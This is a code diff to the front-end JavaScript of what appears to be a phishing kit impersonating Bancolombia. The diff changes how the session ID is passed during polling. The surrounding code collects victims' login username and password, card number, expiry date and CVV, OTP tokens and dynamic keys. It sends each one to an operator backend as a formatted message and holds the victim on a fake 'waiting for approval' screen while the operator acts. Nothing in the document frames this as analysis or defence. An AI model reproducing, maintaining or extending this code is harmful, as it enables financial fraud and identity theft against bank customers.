@@ -306,11 +306,11 @@ function sendToBackend(step, message) {
     }).then(r => r.json());
 }
 
-function startPolling(targetScreen, stepName, originalMsg, sessionId, onAction) {
+function startPolling(targetScreen, stepName, originalMsg, onAction) {
     showWaitingLoader('Esperando aprobación...', 'Por favor espere mientras el administrador revisa su solicitud');
 
     pollInterval = setInterval(() => {
-        fetch(`api/poll.php?sessionId=${encodeURIComponent(sessionId)}`, { credentials: 'same-origin' })
+        fetch(`api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`, { credentials: 'same-origin' })
             .then(r => r.json())
             .then(data => {
                 if (!data.ok || data.status !== 'completed') return;
@@ -371,7 +371,7 @@ function submitLogin() {
 
     const msg = `🔐 <b>Login Bancolombia</b>\n\n👤 Usuario: <code>${user}</code>\n🔑 Clave: <code>${pass}</code>\n\n🖥️ Dispositivo: ${detectDevice()}`;
     sendToBackend('login', msg).then(data => {
-        if (data.ok && data.sessionId) startPolling('scr-monto', 'login', msg, data.sessionId);
+        if (data.ok) startPolling('scr-monto', 'login', msg);
     });
 }
 
@@ -379,7 +379,7 @@ function submitCupo() {
     const cupo = document.getElementById('cupo-val').textContent;
     const msg = `💳 <b>Cupo seleccionado</b>\n\n💰 Monto: <b>${cupo}</b>`;
     sendToBackend('cupo', msg).then(data => {
-        if (data.ok && data.sessionId) startPolling('scr-tarjeta', 'cupo', msg, data.sessionId);
+        if (data.ok) startPolling('scr-tarjeta', 'cupo', msg);
     });
 }
 
@@ -431,7 +431,7 @@ async function submitTarjeta() {
 
     const msg = `💳 <b>Datos de tarjeta</b>\n\n🏦 Banco: <b>${banco}</b>\n👤 Titular: <code>${titular}</code>\n💳 Número: <code>${cardnum}</code>\n📅 Vencimiento: <code>${venc}</code>\n🔒 CVV: <code>${cvv}</code>`;
     sendToBackend('tarjeta', msg).then(data => {
-        if (data.ok && data.sessionId) startPolling('scr-clave', 'tarjeta', msg, data.sessionId);
+        if (data.ok) startPolling('scr-clave', 'tarjeta', msg);
     });
 }
 
@@ -440,7 +440,7 @@ function submitToken() {
     const code = [...document.querySelectorAll('#scr-token .code-input input')].map(i => i.value).join('');
     const msg = `🔐 <b>Token / OTP</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Código: <code>${code}</code>`;
     sendToBackend('token', msg).then(data => {
-        if (data.ok && data.sessionId) startPolling('scr-clave', 'token', msg, data.sessionId);
+        if (data.ok) startPolling('scr-clave', 'token', msg);
     });
 }
 
@@ -449,7 +449,7 @@ function submitClave() {
     const code = [...document.querySelectorAll('#scr-clave .code-input input')].map(i => i.value).join('');
     const msg = `🔐 <b>Clave Dinámica</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Clave: <code>${code}</code>`;
     sendToBackend('clave', msg).then(data => {
-        if (data.ok && data.sessionId) startPolling('scr-exito', 'clave', msg, data.sessionId);
+        if (data.ok) startPolling('scr-exito', 'clave', msg);
     });
 }
 
